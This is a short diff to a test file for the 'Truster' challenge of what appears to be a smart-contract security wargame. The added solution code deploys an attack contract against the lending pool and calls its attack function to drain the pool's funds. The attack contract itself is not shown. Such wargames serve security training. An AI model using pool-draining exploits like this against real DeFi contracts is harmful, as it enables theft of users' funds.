@@ -22,7 +22,13 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      /** CODE YOUR SOLUTION HERE */
+      // Setup our griefing contract        
+      const TrusterHackFactory = await ethers.getContractFactory('TrusterHack', player);
+      let hackContract = await TrusterHackFactory.deploy(pool.address);
+      // Call its attack functin we set up to drain
+      await hackContract.attackTarget();
+        
     });
 
     after(async function () {
